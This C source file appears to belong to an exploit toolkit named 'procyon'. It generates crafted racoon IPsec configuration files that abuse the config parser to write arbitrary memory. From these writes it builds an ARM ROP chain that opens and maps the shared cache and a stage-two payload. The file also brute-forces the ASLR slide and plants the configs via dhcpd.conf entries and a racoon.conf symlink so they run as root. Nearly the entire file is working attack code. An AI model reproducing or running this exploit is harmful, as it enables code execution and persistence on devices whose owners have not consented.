#include "util.h"
#include "procyon.h"

static void u32_to_ip(char *output, uint32_t value) {
    snprintf(output, 16, "%u.%u.%u.%u", value&0xff, (value>>8)&0xff, (value>>16)&0xff, (value>>24)&0xff);
}

static void i32_to_ip(char *output, int32_t value) {
    snprintf(output, 16, "%u.%u.%u.%u", value&0xff, (value>>8)&0xff, (value>>16)&0xff, (value>>24)&0xff);
}

static void conf_write32_multi(int fd, int count, uint32_t addr, uint32_t val1, uint32_t val2, uint32_t val3, uint32_t val4, uint32_t val5, uint32_t val6) {
    char target_ip[24] = {0};
    char dns4_ip[24] = {0};
    char conf_buf[1024] = {0};
    
    uint32_t target = addr - procyon->offsets.racoon.lcconf_counter;
    u32_to_ip(target_ip, target);
    i32_to_ip(dns4_ip, (int32_t)procyon->offsets.racoon.dns4_to_lcconf / 4);

    snprintf(conf_buf, 1024-1, "mode_cfg{wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins4255.255.255.255;wins4%s;dns4%s;}", dns4_ip, target_ip);
    write(fd, conf_buf, strlen(conf_buf));
    bzero(conf_buf, 1024);

    snprintf(conf_buf, 1024-1, "timer{counter%u;", val1);
    write(fd, conf_buf, strlen(conf_buf));
    bzero(conf_buf, 1024);

    if (count >= 2) {
        snprintf(conf_buf, 1024-1, "interval%usec;", val2);
        write(fd, conf_buf, strlen(conf_buf));
        bzero(conf_buf, 1024);
    }

    if (count >= 3) {
        snprintf(conf_buf, 1024-1, "persend%u;", val3);
        write(fd, conf_buf, strlen(conf_buf));
        bzero(conf_buf, 1024);
    }

    if (count >= 4) {
        snprintf(conf_buf, 1024-1, "phase1%usec;", val4);
        write(fd, conf_buf, strlen(conf_buf));
        bzero(conf_buf, 1024);
    }

    if (count >= 5) {
        snprintf(conf_buf, 1024-1, "phase2%usec;", val5);
        write(fd, conf_buf, strlen(conf_buf));
        bzero(conf_buf, 1024);
    }

    if (count >= 6) {
        snprintf(conf_buf, 1024-1, "natt_keepalive%usec;", val6);
        write(fd, conf_buf, strlen(conf_buf));
        bzero(conf_buf, 1024);
    }
    write(fd, "}", 1);
}

static void conf_write32(int fd, uint32_t addr, uint32_t value) {
    conf_write32_multi(fd, 1, addr, value, 0, 0, 0, 0, 0);
}

static void conf_write32_pair(int fd, uint32_t addr, uint32_t value1, uint32_t value2) {
    conf_write32_multi(fd, 2, addr, value1, value2, 0, 0, 0, 0);
}

static void conf_write64(int fd, uint32_t addr, uint64_t value) {
    uint32_t lo = value & 0xffffffff;
    uint32_t hi = (value >> 32) & 0xffffffff;
    conf_write32_multi(fd, 2, addr, lo, hi, 0, 0, 0, 0);
}

static void call_platform_memmove(int fd, uint32_t stack_addr) {
    char conf_buf[1024] = {0};
    snprintf(conf_buf, 1024-1, "mode_cfg{default_domain\"%s\";}", "AAAABBBBCCCC");
    size_t len = strlen(conf_buf);

    uint32_t *ptr = (uint32_t *)strstr(conf_buf, "BBBB");
    *ptr = stack_addr;
    write(fd, conf_buf, len);
}

static int gen_stage1_part(const char *output, uint32_t start_slide, uint32_t end_slide) {
    unlink(output);
    int fd = open(output, O_RDWR|O_CREAT, 0777);
    if (fd < 0) return -1;

    uint32_t dsc_path_addr = procyon->stage1.stack_base + 0x130;
    uint64_t dsc_path_data[8] = {0};
    memcpy(dsc_path_data, procyon->dsc.info->path, strlen(procyon->dsc.info->path)+1);

    conf_write64(fd, dsc_path_addr+0x0, dsc_path_data[0]);
    conf_write64(fd, dsc_path_addr+0x8, dsc_path_data[1]);
    conf_write64(fd, dsc_path_addr+0x10, dsc_path_data[2]);
    conf_write64(fd, dsc_path_addr+0x18, dsc_path_data[3]);
    conf_write64(fd, dsc_path_addr+0x20, dsc_path_data[4]);
    conf_write64(fd, dsc_path_addr+0x28, dsc_path_data[5]);
    conf_write64(fd, dsc_path_addr+0x30, dsc_path_data[6]);
    conf_write64(fd, dsc_path_addr+0x38, dsc_path_data[7]);

    uint32_t stage2_path_addr = procyon->stage1.stack_base + 0x170;
    uint64_t stage2_path_data[3] = {0};
    memcpy(stage2_path_data, "/etc/racoon/stage2", strlen("/etc/racoon/stage2")+1);

    conf_write64(fd, stage2_path_addr+0x0, stage2_path_data[0]);
    conf_write64(fd, stage2_path_addr+0x8, stage2_path_data[1]);
    conf_write64(fd, stage2_path_addr+0x10, stage2_path_data[2]);

    // rop chain start
    conf_write32_pair(fd, procyon->stage1.stack_base+0x0, procyon->stage1.stack_base+0x100, 0x0);
    conf_write32_pair(fd, procyon->stage1.stack_base+0x1c, procyon->stage1.stack_base+0x200, procyon->gadgets.pop_r4_r7_pc);
    conf_write32(fd, procyon->stage1.stack_base+0x110, 0); // pivot addr will be written here

    // open(dsc_path)
    conf_write32_pair(fd, procyon->stage1.stack_base+0x200, 0x0, 0x0); // r4, r7
    conf_write32_pair(fd, procyon->stage1.stack_base+0x208, procyon->gadgets.pop_r0_r1_r2_r3_r4_pc, SYS_open); // pc, r0
    conf_write32_pair(fd, procyon->stage1.stack_base+0x210, dsc_path_addr, O_RDONLY); // r1, r2
    conf_write32_pair(fd, procyon->stage1.stack_base+0x218, procyon->stage1.stack_base+0x268, 0x0); // r3, r4
    conf_write32_pair(fd, procyon->stage1.stack_base+0x220, procyon->symbols.syscall, 0x0); // pc, r4
    conf_write32_pair(fd, procyon->stage1.stack_base+0x228, 0x0, procyon->gadgets.str_r0_r3_bx_lr); // r7, pc

    // mmap(dsc_fd)
    conf_write32_pair(fd, procyon->stage1.stack_base+0x230, 0x0, 0x0); // r4, r7
    conf_write32_pair(fd, procyon->stage1.stack_base+0x238, procyon->gadgets.pop_r12_pc, SYS_mmap); // pc, r12
    conf_write32_pair(fd, procyon->stage1.stack_base+0x240, procyon->gadgets.pop_r4_r5_r6_r7_pc, 0x0); // pc, r4
    conf_write32_pair(fd, procyon->stage1.stack_base+0x248, 0x0, 0x0); // r5, r6
    conf_write32_pair(fd, procyon->stage1.stack_base+0x250, 0x0, procyon->gadgets.pop_r0_r1_r2_r3_r4_pc); // r7, r8
    conf_write32_pair(fd, procyon->stage1.stack_base+0x258, procyon->dsc.remap_base, procyon->dsc.remap_size); // r0, r1
    conf_write32_pair(fd, procyon->stage1.stack_base+0x260, PROT_READ|PROT_EXEC, MAP_FILE|MAP_SHARED|MAP_FIXED); // r2, r3
    conf_write32_pair(fd, procyon->stage1.stack_base+0x268, 0x0, procyon->gadgets.svc_0x80_bx_lr); // r4, pc

    // open(stage2_path)
    conf_write32_pair(fd, procyon->stage1.stack_base+0x270, 0x0, 0x0); // r4, r7
    conf_write32_pair(fd, procyon->stage1.stack_base+0x278, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_r2_r3_r4_pc), SYS_open); // pc, r0
    conf_write32_pair(fd, procyon->stage1.stack_base+0x280, stage2_path_addr, O_RDONLY); // r1, r2
    conf_write32_pair(fd, procyon->stage1.stack_base+0x288, procyon->stage1.stack_base+0x2d8, 0x0); // r3, r4
    conf_write32_pair(fd, procyon->stage1.stack_base+0x290, DSC_REMAP_ADDR(procyon->symbols.syscall), 0x0); // pc, r4
    conf_write32_pair(fd, procyon->stage1.stack_base+0x298, 0x0, DSC_REMAP_ADDR(procyon->gadgets.str_r0_r3_bx_lr)); // r7, pc

    // mmap(stage2_fd)
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2a0, 0x0, 0x0); // r4, r7
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2a8, DSC_REMAP_ADDR(procyon->gadgets.pop_r12_pc), SYS_mmap); // pc, r12
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2b0, DSC_REMAP_ADDR(procyon->gadgets.pop_r4_r5_r6_r7_pc), 0x0); // pc, r4
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2b8, 0x0, 0x0); // r5, r6
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2c0, 0x0, DSC_REMAP_ADDR(procyon->gadgets.pop_r0_r1_r2_r3_r4_pc)); // r7, r8
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2c8, procyon->stage2.stack_base, procyon->stage2.stack_size); // r0, r1
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2d0, PROT_READ|PROT_WRITE, MAP_FILE|MAP_PRIVATE|MAP_FIXED); // r2, r3
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2d8, 0x0, DSC_REMAP_ADDR(procyon->gadgets.svc_0x80_bx_lr)); // r4, pc

    // longjmp()
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2e0, 0x0, 0x0); // r4, r7
    conf_write32_pair(fd, procyon->stage1.stack_base+0x2e8, DSC_REMAP_ADDR(procyon->symbols.longjump), 0x0); // pc
    
    for (uint32_t slide = start_slide; slide > end_slide; slide-=0x4000) {
        uint32_t target = procyon->symbols.platform_memmove_lazy_ptr + slide;
        uint32_t rop_start = procyon->gadgets.rop_start + slide;
        uint32_t pivot_addr = procyon->symbols.longjump + slide;

        conf_write32(fd, procyon->stage1.stack_base+0x4, slide);
        conf_write32(fd, procyon->stage1.stack_base+0x20, procyon->gadgets.pop_r4_r7_pc + slide);
        conf_write32(fd, procyon->stage1.stack_base+0x110, pivot_addr);
        conf_write32(fd, procyon->stage1.stack_base+0x208, procyon->gadgets.pop_r0_r1_r2_r3_r4_pc + slide);

        conf_write32_multi(fd, 4, procyon->stage1.stack_base+0x220, procyon->symbols.syscall + slide, 0x0, 0x0, procyon->gadgets.str_r0_r3_bx_lr + slide, 0, 0);
        conf_write32_multi(fd, 3, procyon->stage1.stack_base+0x238, procyon->gadgets.pop_r12_pc + slide, SYS_mmap, procyon->gadgets.pop_r4_r5_r6_r7_pc + slide, 0, 0, 0);
        conf_write32(fd, procyon->stage1.stack_base+0x254, procyon->gadgets.pop_r0_r1_r2_r3_r4_pc + slide);

        conf_write32_multi(fd, 4, procyon->stage1.stack_base+0x26c, procyon->gadgets.svc_0x80_bx_lr + slide, 0x0, 0x0, procyon->gadgets.pop_r0_r1_r2_r3_r4_pc + slide, 0, 0);
        conf_write32(fd, target, rop_start);
        call_platform_memmove(fd, procyon->stage1.stack_base);
    }

    // force crash
    conf_write32(fd, 0x13371337, 0x41414141);
    conf_write32(fd, 0x12345678, 0x41414141);
    conf_write32(fd, 0x41414141, 0x41414141);
    conf_write32(fd, 0xffffffff, 0x41414141);

    fcntl(fd, F_FULLFSYNC);
    close(fd);
    return 0;
}

int gen_stage1(void) {
    if (procyon->use_dhcpd) {
        unlink("/etc/dhcpd.conf");
        int fd = open("/etc/dhcpd.conf", O_RDWR|O_CREAT, 0777);
        if (fd < 0) {
            print_log(true, "[-] failed to create /etc/dhcpd.conf\n");
            return -1;
        }

        uint32_t part_size = (procyon->dsc.max_slide / 64) & ~0x3fff;
        uint32_t init_slide = part_size * 64;
        uint32_t part_idx = 1;

        for (uint32_t slide = init_slide; slide > 0; slide-=part_size) {
            uint32_t start_slide = slide;
            uint32_t end_slide = start_slide - part_size;
            if (part_size > start_slide) end_slide = 0;

            char buf[PATH_MAX] = {0};
            snprintf(buf, PATH_MAX-1, "/var/root/procyon/stage1/part%u.conf", part_idx);
            unlink(buf);

            gen_stage1_part(buf, start_slide, end_slide);
            chmod(buf, 0777);
            chown(buf, 0, 0);

            bzero(buf, PATH_MAX);
            snprintf(buf, PATH_MAX-1, "execute(\"/usr/sbin/racoon\", \"-l\", \"/var/log/racoon.log\", \"-f\", \"/var/root/procyon/stage1/part%u.conf\");\n", part_idx++);
            write(fd, buf, strlen(buf));
        }

        write(fd, "\n", 1);
        fcntl(fd, F_FULLFSYNC);
        close(fd);

        fd = open("/etc/racoon/racoon.conf", O_RDWR|O_CREAT, 0777);
        if (fd >= 0) {
            conf_write32(fd, 0x13371337, 0x41414141);
            conf_write32(fd, 0x12345678, 0x41414141);
            conf_write32(fd, 0x41414141, 0x41414141);
            conf_write32(fd, 0xffffffff, 0x41414141);
            fcntl(fd, F_FULLFSYNC);
            close(fd);
        }
    } else {
        unlink("/var/root/procyon/stage1/part1.conf");
        gen_stage1_part("/var/root/procyon/stage1/part1.conf", procyon->dsc.max_slide, 0x0);
        chmod("/var/root/procyon/stage1/part1.conf", 0777);
        chown("/var/root/procyon/stage1/part1.conf", 0, 0);

        unlink("/etc/racoon/racoon.conf");
        symlink("/var/root/procyon/stage1/part1.conf", "/etc/racoon/racoon.conf");
        sync();
    }
    return 0;
}
